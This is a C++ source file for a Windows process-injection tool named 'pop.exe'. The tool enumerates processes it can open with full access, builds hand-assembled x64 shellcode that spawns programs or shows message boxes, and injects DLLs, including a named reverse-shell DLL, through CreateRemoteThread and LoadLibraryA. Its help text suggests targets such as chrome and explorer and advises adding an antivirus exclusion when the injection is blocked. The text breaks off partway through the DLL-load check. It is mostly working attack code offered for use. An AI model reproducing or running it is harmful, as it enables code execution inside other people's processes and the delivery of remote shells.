// pop.cpp — flexible shellcode injector (works on ANY x64 process you can open)
//
// Modes:
//   --list                                  Show every running process you can
//                                           inject into (OpenProcess with full
//                                           access succeeds). PID, name, user,
//                                           memory, GUI/console. Sorted biggest
//                                           first.
//
//   pop.exe                                 Default target: MVTC → spawn notepad
//   pop.exe <PID>                           That PID → spawn notepad
//   pop.exe <name>                          That process → spawn notepad
//   pop.exe <PID|name> <program>            Target → spawn <program>
//
//   pop.exe --msg                           MVTC → MessageBox popup
//   pop.exe <target> --msg                  Target → MessageBox popup
//   pop.exe <target> --msg "custom text"    MessageBox with your text
//
// Target selection (any application works):
//   - By name:   pop.exe chrome
//                pop.exe firefox.exe
//                pop.exe explorer
//                pop.exe discord
//   - By PID:    pop.exe 3344
//
// Build:
//   cl /EHsc /O2 /nologo pop.cpp /link psapi.lib user32.lib advapi32.lib /OUT:pop.exe

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <io.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// ---- ANSI color (C1 "classic pentester" palette) ----
// Auto-disabled when stdout is redirected or when --no-color is passed.
static bool g_color = true;
#define C(s)    (g_color ? "\x1b[" s "m" : "")
#define RESET   C("0")
#define BOLD    C("1")
#define RED     C("91")
#define GREEN   C("92")
#define YELLOW  C("93")
#define CYAN    C("96")
#define GRAY    C("90")

static void enable_color(void) {
    if (!_isatty(_fileno(stdout))) { g_color = false; return; }
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    if (GetConsoleMode(h, &mode))
        SetConsoleMode(h, mode | 0x0004);   // ENABLE_VIRTUAL_TERMINAL_PROCESSING
}

static void get_user_for_pid(DWORD pid, char* out, size_t cap) {
    strncpy_s(out, cap, "-", _TRUNCATE);
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return;
    HANDLE tok;
    if (OpenProcessToken(h, TOKEN_QUERY, &tok)) {
        BYTE buf[256]; DWORD need = 0;
        if (GetTokenInformation(tok, TokenUser, buf, sizeof(buf), &need)) {
            TOKEN_USER* tu = (TOKEN_USER*)buf;
            char name[128] = "", dom[128] = ""; DWORD nl = 128, dl = 128;
            SID_NAME_USE snu;
            if (LookupAccountSidA(nullptr, tu->User.Sid, name, &nl, dom, &dl, &snu)) {
                _snprintf_s(out, cap, _TRUNCATE, "%s\\%s", dom, name);
            }
        }
        CloseHandle(tok);
    }
    CloseHandle(h);
}

static bool has_gui(DWORD pid) {
    struct Ctx { DWORD pid; bool found; };
    Ctx c = { pid, false };
    EnumWindows([](HWND h, LPARAM lp) -> BOOL {
        Ctx* c = (Ctx*)lp;
        DWORD wpid = 0;
        GetWindowThreadProcessId(h, &wpid);
        if (wpid == c->pid && IsWindowVisible(h)) { c->found = true; return FALSE; }
        return TRUE;
    }, (LPARAM)&c);
    return c.found;
}

static void list_injectable() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { printf("[!] snapshot failed\n"); return; }

    struct Row { DWORD pid; char name[64]; char user[96]; SIZE_T ws; bool gui; };
    std::vector<Row> rows;
    rows.reserve(256);

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) do {
        if (pe.th32ProcessID <= 4) continue;              // skip System idle/System
        HANDLE t = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
        if (!t) continue;                                 // can't inject here
        CloseHandle(t);

        Row r = {};
        r.pid = pe.th32ProcessID;
        strncpy_s(r.name, sizeof(r.name), pe.szExeFile, _TRUNCATE);
        get_user_for_pid(r.pid, r.user, sizeof(r.user));

        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, r.pid);
        if (h) {
            PROCESS_MEMORY_COUNTERS pmc = {};
            if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc))) r.ws = pmc.WorkingSetSize;
            CloseHandle(h);
        }
        r.gui = has_gui(r.pid);
        rows.push_back(r);
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);

    // Sort by working set descending (biggest = most interesting)
    std::sort(rows.begin(), rows.end(), [](const Row& a, const Row& b){ return a.ws > b.ws; });

    printf("\n== Injectable processes (OpenProcess PROCESS_ALL_ACCESS succeeded) ==\n");
    printf("    PID  Name                             User                          MB   UI\n");
    printf("------  -------------------------------  ----------------------------  -----  --\n");
    int shown = 0;
    for (const auto& r : rows) {
        if (shown >= 40) break;                            // top 40
        printf("%6lu  %-31s  %-28s  %5.1f   %s\n",
               r.pid, r.name, r.user, r.ws / (1024.0 * 1024.0), r.gui ? "yes" : "-");
        shown++;
    }
    printf("\n%zu total injectable processes.  Pick one and run:\n", rows.size());
    printf("  pop.exe <PID>               -> spawn notepad under it\n");
    printf("  pop.exe <PID> --msg         -> pop a MessageBox owned by it\n");
    printf("  pop.exe <name> --msg \"txt\"  -> target by name, custom text\n\n");
    printf("Tip: UI=yes columns are safe targets for --msg (user32 is loaded).\n");
    printf("     UI=- (console) usually also works for spawn mode.\n");
}

static DWORD find_by_name(const char* name) {
    char target[260];
    strncpy_s(target, sizeof(target), name, _TRUNCATE);
    size_t len = strlen(target);
    if (len < 4 || _stricmp(target + len - 4, ".exe") != 0) {
        strncat_s(target, sizeof(target), ".exe", _TRUNCATE);
    }

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD best_pid = 0;
    SIZE_T best_set = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, target) != 0) continue;
        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!h) continue;
        PROCESS_MEMORY_COUNTERS pmc = {};
        if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc)) && pmc.WorkingSetSize > best_set) {
            best_set = pmc.WorkingSetSize;
            best_pid = pe.th32ProcessID;
        }
        CloseHandle(h);
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return best_pid;
}

static void get_name_for_pid(DWORD pid, char* out, size_t cap) {
    strncpy_s(out, cap, "unknown", _TRUNCATE);
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return;
    char path[MAX_PATH] = "";
    DWORD plen = MAX_PATH;
    if (QueryFullProcessImageNameA(h, 0, path, &plen)) {
        const char* bn = strrchr(path, '\\');
        strncpy_s(out, cap, bn ? bn + 1 : path, _TRUNCATE);
    }
    CloseHandle(h);
}

static void get_path_for_pid(DWORD pid, char* out, size_t cap) {
    strncpy_s(out, cap, "-", _TRUNCATE);
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return;
    DWORD plen = (DWORD)cap;
    QueryFullProcessImageNameA(h, 0, out, &plen);
    CloseHandle(h);
}

static const char* arch_for_pid(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return "?";
    BOOL wow = FALSE;
    const char* r = "?";
    if (IsWow64Process(h, &wow)) r = wow ? "x86 (WOW64)" : "x64";
    CloseHandle(h);
    return r;
}

static double memory_mb_for_pid(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return 0.0;
    PROCESS_MEMORY_COUNTERS pmc = {};
    double mb = 0.0;
    if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc)))
        mb = pmc.WorkingSetSize / (1024.0 * 1024.0);
    CloseHandle(h);
    return mb;
}

static const char* err_name(DWORD e) {
    switch (e) {
        case 0:   return "SUCCESS";
        case 5:   return "ERROR_ACCESS_DENIED (run as Administrator, or target is protected)";
        case 87:  return "ERROR_INVALID_PARAMETER (PID does not exist)";
        case 6:   return "ERROR_INVALID_HANDLE";
        case 8:   return "ERROR_NOT_ENOUGH_MEMORY";
        case 126: return "ERROR_MOD_NOT_FOUND (DLL or a dependency could not be loaded)";
        case 193: return "ERROR_BAD_EXE_FORMAT (arch mismatch — x86 DLL into x64 target or vice versa)";
        case 998: return "ERROR_NOACCESS (bad memory address in target)";
        case 1114:return "ERROR_DLL_INIT_FAILED (DLL loaded but DllMain returned FALSE)";
        default:  return "(no symbolic name mapped)";
    }
}

static const char* pe_arch_of_file(const char* path);   // forward decl

// Normalize arch strings ("x64", "x86 (WOW64)", "ARM64") -> "x64" / "x86" / "ARM64" / "?"
static const char* arch_short(const char* a) {
    if (strncmp(a, "x64",   3) == 0) return "x64";
    if (strncmp(a, "x86",   3) == 0) return "x86";
    if (strncmp(a, "ARM64", 5) == 0) return "ARM64";
    return "?";
}

// Search the directory of `originalDll` for a .dll whose PE Machine matches `wantArch`
// ("x64" | "x86" | "ARM64"). Returns true + fills outPath if a match is found.
static bool find_sibling_dll(const char* originalDll, const char* wantArch,
                             char* outPath, size_t outCap) {
    char dir[MAX_PATH];
    strncpy_s(dir, sizeof(dir), originalDll, _TRUNCATE);
    char* lastSlash = strrchr(dir, '\\');
    if (!lastSlash) return false;
    *lastSlash = 0;

    char search[MAX_PATH];
    _snprintf_s(search, sizeof(search), _TRUNCATE, "%s\\*.dll", dir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search, &fd);
    if (h == INVALID_HANDLE_VALUE) return false;

    bool found = false;
    do {
        char candidate[MAX_PATH];
        _snprintf_s(candidate, sizeof(candidate), _TRUNCATE, "%s\\%s", dir, fd.cFileName);
        if (_stricmp(candidate, originalDll) == 0) continue;     // skip the one we started with
        const char* cand_arch = pe_arch_of_file(candidate);
        if (strcmp(cand_arch, wantArch) == 0) {
            strncpy_s(outPath, outCap, candidate, _TRUNCATE);
            found = true;
            break;
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return found;
}

static const char* pe_arch_of_file(const char* path) {
    HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return "?";
    BYTE hdr[0x400] = {};
    DWORD rd = 0;
    ReadFile(f, hdr, sizeof(hdr), &rd, nullptr);
    CloseHandle(f);
    if (rd < 0x40 || hdr[0] != 'M' || hdr[1] != 'Z') return "not a PE";
    DWORD e_lfanew = *(DWORD*)(hdr + 0x3C);
    if (e_lfanew + 6 > rd) return "?";
    if (hdr[e_lfanew] != 'P' || hdr[e_lfanew+1] != 'E') return "not a PE";
    WORD machine = *(WORD*)(hdr + e_lfanew + 4);
    switch (machine) {
        case 0x8664: return "x64";
        case 0x014c: return "x86";
        case 0xaa64: return "ARM64";
        default:     return "unknown";
    }
}

static long long file_size_bytes(const char* path) {
    WIN32_FILE_ATTRIBUTE_DATA fad = {};
    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &fad)) return -1;
    LARGE_INTEGER li; li.HighPart = fad.nFileSizeHigh; li.LowPart = fad.nFileSizeLow;
    return li.QuadPart;
}

// Print a dot-leader step line:
//   [N]  <desc>  ........  <status>  <value>
// Every line's status column lands at the same column regardless of desc width.
static void step(int n, const char* desc, const char* status, const char* value) {
    const int W = 50;                       // target width of (desc + leader)
    int dlen = (int)strlen(desc);
    char leader[80];
    int li = 0;
    leader[li++] = ' '; leader[li++] = ' '; // 2 spaces after desc
    int dots = W - dlen - 4;                // 2 sp before dots, 2 sp after
    if (dots < 2) dots = 2;
    for (int i = 0; i < dots && li < (int)sizeof(leader) - 3; i++) leader[li++] = '.';
    leader[li++] = ' '; leader[li++] = ' ';
    leader[li] = 0;
    bool ok = (strcmp(status, "ok") == 0);
    const char* status_color = ok ? GREEN : RED;
    printf("    [%s%d%s]  %s%s%s%s%s%-4s%s %s%s%s\n",
           CYAN, n, RESET,
           desc,
           GRAY, leader, RESET,
           status_color, BOLD, status, RESET,
           CYAN, value, RESET);
}

// Format a pointer with leading zeros stripped: "0x1DAE7EB0000", not "000001DAE7EB0000"
static const char* short_ptr(const void* p, char* out, size_t cap) {
    unsigned long long v = (unsigned long long)(uintptr_t)p;
    _snprintf_s(out, cap, _TRUNCATE, "0x%llX", v);
    return out;
}

static void show_top5_pids(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    struct R { DWORD pid; char name[64]; SIZE_T ws; };
    std::vector<R> rows;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) do {
        if (pe.th32ProcessID <= 4) continue;
        HANDLE t = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
        if (!t) continue;
        CloseHandle(t);
        R r = {}; r.pid = pe.th32ProcessID;
        strncpy_s(r.name, sizeof(r.name), pe.szExeFile, _TRUNCATE);
        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, r.pid);
        if (h) {
            PROCESS_MEMORY_COUNTERS pmc = {};
            if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc))) r.ws = pmc.WorkingSetSize;
            CloseHandle(h);
        }
        rows.push_back(r);
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    std::sort(rows.begin(), rows.end(), [](const R& a, const R& b){ return a.ws > b.ws; });
    printf("[*] top 5 live PIDs:\n");
    int n = 0;
    for (const auto& r : rows) {
        if (n++ >= 5) break;
        printf("      %-6lu  %-28s  %6.1f MB\n", r.pid, r.name, r.ws / (1024.0 * 1024.0));
    }
}

static bool is_all_digits(const char* s) {
    if (!s || !*s) return false;
    for (; *s; s++) if (*s < '0' || *s > '9') return false;
    return true;
}

static void usage(const char* prog) {
    printf("Usage:\n");
    printf("  %s                                 MVTC -> MessageBox (default text)\n", prog);
    printf("  %s <target>                        target -> MessageBox (default text)\n", prog);
    printf("  %s <target> \"your message\"         target -> MessageBox with YOUR text\n", prog);
    printf("  %s <target> --spawn <program>      target -> spawn <program> as child\n", prog);
    printf("  %s <target> --dll <path>           target -> LoadLibrary(path) (revshell)\n", prog);
    printf("  %s --list                          list every injectable process\n", prog);
    printf("  %s --help                          this help\n", prog);
    printf("  %s --no-color                     disable ANSI colors\n\n", prog);
    printf("Target is a PID or a process name. Use pop_x64.exe on x64 targets and\n");
    printf("pop_x86.exe on x86 (WOW64) targets. DLL arch auto-switches if a sibling\n");
    printf("(revshell_x86.dll / revshell_pure_dll.dll) sits in the same folder.\n\n");

    printf("Common targets:\n");
    printf("  %s --list                          see what you can inject into\n", prog);
    printf("  %s chrome                          by name (largest instance wins)\n", prog);
    printf("  %s 1234                            by PID\n", prog);
    printf("  %s notepad.exe                     by full image name\n\n", prog);

    printf("Spawn small apps as a child of the target (good for PoC screenshots):\n");
    printf("  %s <target> --spawn calc.exe             Calculator\n", prog);
    printf("  %s <target> --spawn notepad.exe          Notepad\n", prog);
    printf("  %s <target> --spawn mspaint.exe          Paint\n", prog);
    printf("  %s <target> --spawn cmd.exe              a cmd window\n", prog);
    printf("  %s <target> --spawn powershell.exe       PowerShell\n", prog);
    printf("  %s <target> --spawn \"cmd /k whoami\"      cmd running whoami\n", prog);
    printf("  %s <target> --spawn \"cmd /k systeminfo\"  cmd running systeminfo\n\n", prog);

    printf("MessageBox (visible banner inside the target):\n");
    printf("  %s explorer \"I was here\"           custom text in explorer\n", prog);
    printf("  %s 1234 \"PWNED by m14r41\"           custom text in PID 1234\n\n", prog);

    printf("Reverse shell (DLL injection):\n");
    printf("  %s <target> --dll revshell_pure_dll.dll   auto-arch (x64/x86)\n", prog);
}

// Build shellcode that calls WinExec("program", SW_SHOWNORMAL); ret
// Returns malloc'd buffer; caller free()s.
static unsigned char* build_spawn_shellcode(const char* cmd, size_t* outLen) {
    FARPROC winexec = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!winexec) return nullptr;

    size_t cmdlen = strlen(cmd) + 1;
    size_t sclen = 33 + cmdlen;
    unsigned char* sc = (unsigned char*)malloc(sclen);
    static const unsigned char prolog[33] = {
        0x48,0x83,0xEC,0x28,                           // sub rsp, 0x28
        0x48,0x8D,0x0D, 0x16,0x00,0x00,0x00,           // lea rcx, [rip + 0x16]
        0xBA,0x01,0x00,0x00,0x00,                      // mov edx, 1  (SW_SHOWNORMAL)
        0x48,0xB8, 0,0,0,0,0,0,0,0,                    // mov rax, <WinExec>
        0xFF,0xD0,                                     // call rax
        0x48,0x83,0xC4,0x28,                           // add rsp, 0x28
        0xC3                                           // ret
    };
    memcpy(sc, prolog, sizeof(prolog));
    memcpy(sc + 18, &winexec, 8);
    memcpy(sc + 33, cmd, cmdlen);
    *outLen = sclen;
    return sc;
}

// Build shellcode that calls MessageBoxA(NULL, text, caption, flags); ret
// Flags set to always-on-top + foreground + info icon so you can't miss it.
static unsigned char* build_msgbox_shellcode(const char* text, size_t* outLen) {
    HMODULE user32 = LoadLibraryA("user32.dll");
    if (!user32) return nullptr;
    FARPROC messagebox_fn = GetProcAddress(user32, "MessageBoxA");
    if (!messagebox_fn) return nullptr;

    static const char* caption = "Process Injection Demo";
    size_t text_len = strlen(text) + 1;
    size_t cap_len  = strlen(caption) + 1;
    size_t code_len = 43;
    size_t sclen    = code_len + text_len + cap_len;

    unsigned char* sc = (unsigned char*)malloc(sclen);

    // MessageBox uType = MB_OK | MB_ICONINFORMATION = 0x40
    DWORD mb_flags = 0x00000040;

    sc[0]=0x48; sc[1]=0x83; sc[2]=0xEC; sc[3]=0x28;        // sub rsp, 0x28
    sc[4]=0x31; sc[5]=0xC9;                                 // xor ecx, ecx (HWND=NULL)
    sc[6]=0x48; sc[7]=0x8D; sc[8]=0x15;                     // lea rdx, [rip + text_disp]
    DWORD text_disp = (DWORD)(43 - 13);
    memcpy(sc + 9, &text_disp, 4);
    sc[13]=0x4C; sc[14]=0x8D; sc[15]=0x05;                  // lea r8, [rip + cap_disp]
    DWORD cap_disp = (DWORD)(43 + text_len - 20);
    memcpy(sc + 16, &cap_disp, 4);
    sc[20]=0x41; sc[21]=0xB9;                               // mov r9d, imm32
    memcpy(sc + 22, &mb_flags, 4);                          // flags
    sc[26]=0x48; sc[27]=0xB8;                               // mov rax, imm64
    memcpy(sc + 28, &messagebox_fn, 8);                     // MessageBoxA
    sc[36]=0xFF; sc[37]=0xD0;                               // call rax
    sc[38]=0x48; sc[39]=0x83; sc[40]=0xC4; sc[41]=0x28;     // add rsp, 0x28
    sc[42]=0xC3;                                            // ret
    memcpy(sc + 43, text, text_len);
    memcpy(sc + 43 + text_len, caption, cap_len);
    *outLen = sclen;
    return sc;
}

int main(int argc, char** argv) {
    // --no-color flag disables ANSI even on a TTY (strip before main loop)
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-color") == 0) {
            g_color = false;
            for (int j = i; j < argc - 1; j++) argv[j] = argv[j + 1];
            argc--; i--;
        }
    }
    if (g_color) enable_color();

    const char* target_arg = nullptr;
    const char* spawn_cmd  = nullptr;
    bool msg_mode = true;                    // default: MessageBox
    const char* custom_msg = nullptr;
    const char* dll_path = nullptr;          // --dll path (reverse shell etc.)

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--list") == 0 || strcmp(argv[i], "-l") == 0) {
            list_injectable();
            return 0;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "/?") == 0) {
            usage(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "--spawn") == 0 || strcmp(argv[i], "-s") == 0) {
            msg_mode = false;
            if (i + 1 < argc) { spawn_cmd = argv[i + 1]; i++; }
            else spawn_cmd = "notepad.exe";
        } else if (strcmp(argv[i], "--dll") == 0 || strcmp(argv[i], "-d") == 0) {
            msg_mode = false;
            if (i + 1 < argc) { dll_path = argv[i + 1]; i++; }
            else { printf("[!] --dll needs a path\n"); return 1; }
        } else if (strcmp(argv[i], "--msg") == 0 || strcmp(argv[i], "-m") == 0) {
            msg_mode = true;
            if (i + 1 < argc && argv[i+1][0] != '-') {
                custom_msg = argv[i + 1];
                i++;
            }
        } else if (!target_arg) {
            target_arg = argv[i];
        } else {
            custom_msg = argv[i];
            msg_mode = true;
        }
    }
    if (!spawn_cmd && !dll_path && !msg_mode) spawn_cmd = "notepad.exe";

    // Ensure user32.dll is loaded in THIS process so GetProcAddress returns a
    // valid base - and so the address matches what the target already has.
    LoadLibraryA("user32.dll");

    DWORD target_pid = 0;
    const char* resolve_name = target_arg ? target_arg : "MVTC.exe";
    if (is_all_digits(resolve_name)) {
        target_pid = (DWORD)strtoul(resolve_name, nullptr, 10);
        // Validate the PID actually exists before any injection work.
        HANDLE hVerify = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
        if (!hVerify) {
            DWORD e = GetLastError();
            char desc[128], val[64];
            _snprintf_s(desc, sizeof(desc), _TRUNCATE,
                        "OpenProcess(%lu, PROCESS_ALL_ACCESS)", target_pid);
            _snprintf_s(val, sizeof(val), _TRUNCATE, "err %lu", e);
            printf("%s[+]%s target\n", GREEN, RESET);
            printf("    - PID %s%lu%s (resolving...)\n\n", CYAN, target_pid, RESET);
            step(1, desc, "fail", val);
            printf("\n%s[!]%s %s%sfailed%s   step [1] - %s\n",
                   RED, RESET, RED, BOLD, RESET, err_name(e));
            printf("%s[*]%s %shint%s     pop.exe --list    pop.exe <name>\n",
                   YELLOW, RESET, YELLOW, RESET);
            show_top5_pids();
            system("pause");
            return 1;
        }
        CloseHandle(hVerify);
    } else {
        target_pid = find_by_name(resolve_name);
    }
    if (!target_pid) {
        printf("%s[+]%s target\n", GREEN, RESET);
        printf("    - %s%s%s (not running)\n\n", CYAN, resolve_name, RESET);
        printf("%s[!]%s %s%sfailed%s   no process named '%s' is running on this machine\n",
               RED, RESET, RED, BOLD, RESET, resolve_name);
        printf("%s[*]%s %shint%s     pop.exe --list    tasklist    (launch the app first)\n",
               YELLOW, RESET, YELLOW, RESET);
        show_top5_pids();
        system("pause");
        return 1;
    }

    char host_name[260] = {}, host_path[MAX_PATH] = {}, host_user[128] = {};
    get_name_for_pid(target_pid, host_name, sizeof(host_name));
    get_path_for_pid(target_pid, host_path, sizeof(host_path));
    get_user_for_pid(target_pid, host_user, sizeof(host_user));
    double host_mb = memory_mb_for_pid(target_pid);
    const char* host_arch = arch_for_pid(target_pid);

    printf("%s[+]%s target\n", GREEN, RESET);
    printf("    - PID %s%lu%s, name %s%s%s, arch %s%s%s\n",
           CYAN, target_pid, RESET, CYAN, host_name, RESET, CYAN, host_arch, RESET);
    printf("    - user %s%s%s, memory %s%.1f MB%s\n",
           CYAN, host_user, RESET, CYAN, host_mb, RESET);

    unsigned char* sc = nullptr;
    size_t sclen = 0;
    char default_msg[512];

    // --dll mode: classic CreateRemoteThread(LoadLibraryA, path) chain
    if (dll_path) {
        char fullDll[MAX_PATH];
        if (!GetFullPathNameA(dll_path, MAX_PATH, fullDll, nullptr)) {
            printf("%s[!]%s %s%sfailed%s   could not resolve DLL path: %s\n",
                   RED, RESET, RED, BOLD, RESET, dll_path);
            system("pause"); return 2;
        }
        long long dll_size = file_size_bytes(fullDll);
        if (dll_size < 0) {
            printf("%s[!]%s %s%sfailed%s   DLL does not exist on disk: %s\n",
                   RED, RESET, RED, BOLD, RESET, fullDll);
            printf("%s[*]%s %shint%s     check the path and try again\n",
                   YELLOW, RESET, YELLOW, RESET);
            system("pause"); return 2;
        }
        const char* dll_arch = pe_arch_of_file(fullDll);
        const char* dll_base = strrchr(fullDll, '\\'); dll_base = dll_base ? dll_base + 1 : fullDll;
        double dll_kb = dll_size / 1024.0;

        printf("\n%s[+]%s payload\n", GREEN, RESET);
        printf("    - %s%s%s (%s%s%s, %s%.0f KB%s)\n",
               CYAN, dll_base, RESET, CYAN, dll_arch, RESET, CYAN, dll_kb, RESET);
        printf("    - %s%s%s\n\n", CYAN, fullDll, RESET);

        const char* target_arch_s = arch_short(host_arch);
        const char* dll_arch_s    = arch_short(dll_arch);
        if (strcmp(target_arch_s, "?") != 0
            && strcmp(dll_arch_s, "?") != 0
            && strcmp(target_arch_s, dll_arch_s) != 0) {

            // Auto-recover: look for a sibling DLL in the same folder with the right arch.
            char swapDll[MAX_PATH];
            if (find_sibling_dll(fullDll, target_arch_s, swapDll, sizeof(swapDll))) {
                printf("%s[*]%s DLL/target arch mismatch (target %s, DLL %s)\n",
                       YELLOW, RESET, host_arch, dll_arch);
                printf("%s[*]%s auto-switching to sibling DLL that matches target: %s%s%s\n",
                       YELLOW, RESET, CYAN, swapDll, RESET);
                strncpy_s(fullDll, sizeof(fullDll), swapDll, _TRUNCATE);
                dll_size = file_size_bytes(fullDll);
                dll_arch = pe_arch_of_file(fullDll);
                dll_base = strrchr(fullDll, '\\'); dll_base = dll_base ? dll_base + 1 : fullDll;
                dll_kb   = dll_size / 1024.0;
                printf("%s[+]%s payload (switched)\n", GREEN, RESET);
                printf("    - %s%s%s (%s%s%s, %s%.0f KB%s)\n",
                       CYAN, dll_base, RESET, CYAN, dll_arch, RESET, CYAN, dll_kb, RESET);
                printf("    - %s%s%s\n\n", CYAN, fullDll, RESET);
            } else {
                printf("%s[!]%s %s%sfailed%s   architecture mismatch: target is %s, DLL is %s\n",
                       RED, RESET, RED, BOLD, RESET, host_arch, dll_arch);
                printf("%s[*]%s %shint%s     put a %s-arch DLL next to this one, or rebuild for %s\n",
                       YELLOW, RESET, YELLOW, RESET, target_arch_s, host_arch);
                system("pause"); return 2;
            }
        }

        char desc[160], val[80], p1[48], p2[48], p3[48];

        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        _snprintf_s(desc, sizeof(desc), _TRUNCATE,
                    "OpenProcess(%lu, PROCESS_ALL_ACCESS)", target_pid);
        if (!hProc) {
            DWORD e = GetLastError();
            _snprintf_s(val, sizeof(val), _TRUNCATE, "err %lu", e);
            step(1, desc, "fail", val);
            printf("\n%s[!]%s %s%sfailed%s   step [1] - %s\n",
                   RED, RESET, RED, BOLD, RESET, err_name(e));
            if (e == 5) printf("%s[*]%s %shint%s     run cmd as Administrator, or pick a process you own\n",
                               YELLOW, RESET, YELLOW, RESET);
            system("pause"); return 3;
        }
        _snprintf_s(val, sizeof(val), _TRUNCATE, "handle %s", short_ptr(hProc, p1, sizeof(p1)));
        step(1, desc, "ok", val);

        size_t len = strlen(fullDll) + 1;
        LPVOID buf = VirtualAllocEx(hProc, nullptr, len,
                                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        _snprintf_s(desc, sizeof(desc), _TRUNCATE, "VirtualAllocEx(%zu, RW)", len);
        if (!buf) {
            DWORD e = GetLastError();
            _snprintf_s(val, sizeof(val), _TRUNCATE, "err %lu", e);
            step(2, desc, "fail", val);
            printf("\n%s[!]%s %s%sfailed%s   step [2] - %s\n",
                   RED, RESET, RED, BOLD, RESET, err_name(e));
            CloseHandle(hProc); system("pause"); return 4;
        }
        step(2, desc, "ok", short_ptr(buf, p2, sizeof(p2)));

        SIZE_T wrote = 0;
        _snprintf_s(desc, sizeof(desc), _TRUNCATE,
                    "WriteProcessMemory(%s, path, %zu)",
                    short_ptr(buf, p1, sizeof(p1)), len);
        if (!WriteProcessMemory(hProc, buf, fullDll, len, &wrote) || wrote != len) {
            DWORD e = GetLastError();
            _snprintf_s(val, sizeof(val), _TRUNCATE, "wrote %zu err %lu", wrote, e);
            step(3, desc, "fail", val);
            printf("\n%s[!]%s %s%sfailed%s   step [3] - %s\n",
                   RED, RESET, RED, BOLD, RESET, err_name(e));
            CloseHandle(hProc); system("pause"); return 4;
        }
        _snprintf_s(val, sizeof(val), _TRUNCATE, "%zu B", wrote);
        step(3, desc, "ok", val);

        LPTHREAD_START_ROUTINE llA = (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        step(4, "GetProcAddress(kernel32, LoadLibraryA)", "ok",
             short_ptr((void*)llA, p3, sizeof(p3)));

        HANDLE hT = CreateRemoteThread(hProc, nullptr, 0, llA, buf, 0, nullptr);
        if (!hT) {
            DWORD e = GetLastError();
            _snprintf_s(val, sizeof(val), _TRUNCATE, "err %lu", e);
            step(5, "CreateRemoteThread(entry=[4], arg=[2])", "fail", val);
            printf("\n%s[!]%s %s%sfailed%s   step [5] - %s\n",
                   RED, RESET, RED, BOLD, RESET, err_name(e));
            if (e == 5) printf("%s[*]%s %shint%s     EDR/Defender blocked remote-thread; try an exclusion\n",
                               YELLOW, RESET, YELLOW, RESET);
            CloseHandle(hProc); system("pause"); return 4;
        }
        _snprintf_s(val, sizeof(val), _TRUNCATE, "tid %s", short_ptr(hT, p1, sizeof(p1)));
        step(5, "CreateRemoteThread(entry=[4], arg=[2])", "ok", val);

        DWORD wr = WaitForSingleObject(hT, 10000);
        DWORD hmod = 0; GetExitCodeThread(hT, &hmod);
        if (wr != WAIT_OBJECT_0) {
            step(6, "GetExitCodeThread", "fail", "timeout (10s)");
            printf("\n%s[!]%s %s%sfailed%s   step [6] - remote thread did not return in time\n",
                   RED, RESET, RED, BOLD, RESET);
            printf("%s[*]%s %shint%s     the DLL's DllMain may be blocking; try a simpler DLL\n",
                   YELLOW, RESET, YELLOW, RESET);
            CloseHandle(hT); CloseHandle(hProc); system("pause"); return 5;
        }
        if (hmod == 0) {
            step(6, "GetExitCodeThread", "fail", "HMODULE 0 (load failed)");
